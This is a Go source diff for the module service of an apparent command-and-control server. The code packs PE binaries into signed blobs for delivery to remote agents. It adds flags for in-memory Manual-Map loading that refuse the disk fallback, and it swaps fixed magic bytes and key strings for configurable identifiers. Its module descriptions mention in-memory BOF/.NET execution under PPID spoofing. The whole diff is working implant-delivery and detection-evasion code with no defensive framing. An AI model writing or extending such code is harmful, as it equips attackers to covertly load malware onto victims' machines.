@@ -9,13 +9,14 @@ import (
 	"path/filepath"
 	"strings"
 	"sync"
+
+	"cupcake-server/pkg/utils"
 )
 
-// CKMS module package format (must match Client/core/src/module_package.rs)
+// Module package format (must match Client/core/src/module_package.rs + wire_ids)
 // MAGIC | ver(u16le) | flags(u16le) | id_len(u16le) | id | pay_len(u32le) | payload | hmac32
 
 const (
-	ckmsMagic   = "CKMS"
 	ckmsVersion = uint16(1)
 )
 
@@ -24,8 +25,10 @@ type ModuleCatalogEntry struct {
 	ID          string `json:"id"`
 	Name        string `json:"name"`
 	Description string `json:"description"`
-	Kind        string `json:"kind"` // host | runtime | legacy
-	Size        int    `json:"size"`
+	Kind        string `json:"kind"` // host | runtime | legacy | custom
+	// LoadMode: product load path — mem (Manual-Map) | iso (iso_host) | legacy (LoadLibrary)
+	LoadMode string `json:"load_mode"`
+	Size     int    `json:"size"`
 	// LoadedOnAgent: when listing with ?uuid=, whether agent currently holds this module
 	LoadedOnAgent bool `json:"loaded_on_agent,omitempty"`
 }
@@ -63,16 +66,16 @@ func GetModuleService() *ModuleService {
 
 // DefaultModuleKey matches Rust default_module_key() for dev/unpatched agents (exactly 32 bytes).
 func DefaultModuleKey() []byte {
-	seed := []byte("CUPCAKE_MODULE_KEY_V1_DEFAULT___") // 32 bytes
+	seed := []byte("DEV_ONLY_MODULE_KEY_V1_DO_NOT___") // 32 bytes
 	k := make([]byte, 32)
 	copy(k, seed)
 	return k
 }
 
-// DeriveModuleKey matches Rust derive_module_key(aes_key).
+// DeriveModuleKey matches Rust derive_module_key(aes_key) — domain from wire seed.
 func DeriveModuleKey(aesKey []byte) []byte {
 	h := sha256.New()
-	h.Write([]byte("cupcake-mod-key-v1"))
+	h.Write(utils.GetWireIDs().ModKeyDomain)
 	h.Write(aesKey)
 	return h.Sum(nil)
 }
@@ -118,28 +121,61 @@ func (m *ModuleService) LoadFromFile(id, path string) error {
 	return m.RegisterRaw(id, b)
 }
 
-// PackCKMS builds a signed CKMS blob for module id.
-func (m *ModuleService) PackCKMS(id string) ([]byte, error) {
+// resolveRaw returns registered PE bytes for module id (memory then disk).
+func (m *ModuleService) resolveRaw(id string) ([]byte, error) {
 	m.mu.RLock()
 	pe, ok := m.raw[id]
 	m.mu.RUnlock()
-	if !ok || len(pe) == 0 {
-		// try disk
-		path := filepath.Join(m.dir, sanitizeID(id)+".bin")
-		b, err := os.ReadFile(path)
-		if err != nil {
-			return nil, fmt.Errorf("module %q not found", id)
-		}
-		m.mu.Lock()
-		m.raw[id] = b
-		m.mu.Unlock()
-		pe = b
+	if ok && len(pe) > 0 {
+		return pe, nil
+	}
+	path := filepath.Join(m.dir, sanitizeID(id)+".bin")
+	b, err := os.ReadFile(path)
+	if err != nil {
+		return nil, fmt.Errorf("module %q not found", id)
+	}
+	m.mu.Lock()
+	m.raw[id] = b
+	m.mu.Unlock()
+	return b, nil
+}
+
+// PackCKMS builds a signed CKMS blob for module id using the service key seed
+// (dev/default path). Prefer PackCKMSWithKey for agent pushes.
+func (m *ModuleService) PackCKMS(id string) ([]byte, error) {
+	pe, err := m.resolveRaw(id)
+	if err != nil {
+		return nil, err
 	}
 	return PackModule(id, pe, m.activeKey())
 }
 
-// PackModule is the pure CKMS packer (exported for tests).
+// PackCKMSWithKey packs with an explicit 32-byte module HMAC key (already
+// derive_module_key(aes) material). Avoids global SetKeySeed races across agents.
+func (m *ModuleService) PackCKMSWithKey(id string, moduleHMACKey []byte) ([]byte, error) {
+	if len(moduleHMACKey) < 16 {
+		return nil, fmt.Errorf("module HMAC key too short")
+	}
+	pe, err := m.resolveRaw(id)
+	if err != nil {
+		return nil, err
+	}
+	return PackModule(id, pe, moduleHMACKey)
+}
+
+// CKMS flags (u16 LE) — keep in sync with Client module_package FLAG_*.
+const (
+	CKMSFlagPrefMemMap    uint16 = 1 << 0 // prefer Manual-Map on agent
+	CKMSFlagRequireMemMap uint16 = 1 << 1 // refuse LoadLibrary disk fallback
+)
+
+// PackModule is the pure CKMS packer (exported for tests). Flags default 0.
 func PackModule(id string, payload, key []byte) ([]byte, error) {
+	return PackModuleWithFlags(id, payload, key, 0)
+}
+
+// PackModuleWithFlags packs MAGIC|ver|flags|id|payload|hmac (see Client module_package).
+func PackModuleWithFlags(id string, payload, key []byte, flags uint16) ([]byte, error) {
 	if id == "" || len(id) > 64 {
 		return nil, fmt.Errorf("invalid module id length")
 	}
@@ -148,11 +184,14 @@ func PackModule(id string, payload, key []byte) ([]byte, error) {
 	}
 	idBytes := []byte(id)
 	body := make([]byte, 0, 4+2+2+2+len(idBytes)+4+len(payload)+32)
-	body = append(body, []byte(ckmsMagic)...)
+	pkg := utils.GetWireIDs().PkgMagic
+	body = append(body, pkg[:]...)
 	ver := make([]byte, 2)
 	binary.LittleEndian.PutUint16(ver, ckmsVersion)
 	body = append(body, ver...)
-	body = append(body, 0, 0) // flags
+	fl := make([]byte, 2)
+	binary.LittleEndian.PutUint16(fl, flags)
+	body = append(body, fl...)
 	idLen := make([]byte, 2)
 	binary.LittleEndian.PutUint16(idLen, uint16(len(idBytes)))
 	body = append(body, idLen...)
@@ -175,6 +214,15 @@ func (m *ModuleService) PackBase64(id string) (string, error) {
 	return base64.StdEncoding.EncodeToString(blob), nil
 }
 
+// PackBase64WithKey is PackBase64 with an explicit module HMAC key.
+func (m *ModuleService) PackBase64WithKey(id string, moduleHMACKey []byte) (string, error) {
+	blob, err := m.PackCKMSWithKey(id, moduleHMACKey)
+	if err != nil {
+		return "", err
+	}
+	return base64.StdEncoding.EncodeToString(blob), nil
+}
+
 // List returns registered module ids.
 func (m *ModuleService) List() []string {
 	entries := m.ListCatalog("")
@@ -185,27 +233,33 @@ func (m *ModuleService) List() []string {
 	return out
 }
 
-// ModuleDescribe returns human name/description for known module ids.
+// ModuleDescribe returns human name/description/kind for known module ids.
 func ModuleDescribe(id string) (name, desc, kind string) {
+	name, desc, kind, _ = ModuleDescribeEx(id)
+	return name, desc, kind
+}
+
+// ModuleDescribeEx also returns product load_mode: mem | iso | legacy.
+func ModuleDescribeEx(id string) (name, desc, kind, loadMode string) {
 	switch strings.ToLower(strings.TrimSpace(id)) {
 	case "iso_host", "iso-host":
 		return "隔离执行宿主",
 			"短命 PE（cupcake-iso-host）：PPID 伪装进程内内存执行 BOF/.NET；Agent 本体不跑重能力。",
-			"host"
+			"host", "iso"
 	case "bof":
 		return "BOF 运行时（旧）",
 			"同进程 COFF 执行 DLL（遗留）。当前推荐走 iso_host 隔离路径。",
-			"legacy"
+			"legacy", "legacy"
 	case "dotnet":
 		return ".NET 运行时（旧）",
 			"同进程 CLR 宿主 DLL（遗留）。当前推荐走 iso_host 隔离路径。",
-			"legacy"
+			"legacy", "legacy"
 	case "shell":
 		return "Shell 模块（实验）",
-			"实验性终端模块。日常终端/文件/进程已内置，一般无需推送。",
-			"legacy"
+			"实验性终端模块；同进程 Manual-Map 优先，失败再 LoadLibrary。",
+			"legacy", "mem"
 	default:
-		return id, "自定义模块二进制（CKMS 打包后可下发）。", "custom"
+		return id, "自定义模块二进制（CKMS 打包后可下发；Manual-Map 优先）。", "custom", "mem"
 	}
 }
 
@@ -221,12 +275,13 @@ func (m *ModuleService) ListCatalog(agentUUID string) []ModuleCatalogEntry {
 			return
 		}
 		seen[id] = true
-		name, desc, kind := ModuleDescribe(id)
+		name, desc, kind, loadMode := ModuleDescribeEx(id)
 		e := ModuleCatalogEntry{
 			ID:          id,
 			Name:        name,
 			Description: desc,
 			Kind:        kind,
+			LoadMode:    loadMode,
 			Size:        size,
 		}
 		if agentUUID != "" {
